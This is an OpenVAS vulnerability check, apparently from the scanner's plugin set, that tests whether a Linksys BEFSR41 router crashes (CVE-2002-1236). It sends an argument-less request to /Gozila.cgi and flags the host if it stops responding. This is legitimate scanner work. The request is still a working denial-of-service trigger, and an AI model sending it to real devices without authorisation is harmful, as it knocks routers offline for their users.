###############################################################################
# OpenVAS Vulnerability Test
#
# Linksys Gozila CGI denial of service
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11773");
  script_version("2020-08-24T15:18:35+0000");
  script_cve_id("CVE-2002-1236");
  script_bugtraq_id(6086);
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Linksys Gozila CGI denial of service");
  script_category(ACT_KILL_HOST);
  script_copyright("Copyright (C) 2003 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade your router firmware to 1.42.7.");

  script_tag(name:"summary", value:"The Linksys BEFSR41 EtherFast Cable/DSL Router crashes
  if somebody accesses the Gozila CGI without argument on the web administration interface.");

  script_tag(name:"qod_type", value:"remote_probe");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

start_denial();

# Maybe we should look into the misc CGI directories?
req = http_get(port: port, item: "/Gozila.cgi?");
http_send_recv(port: port, data:req);

alive = end_denial();
if (! alive) security_message(port:port);
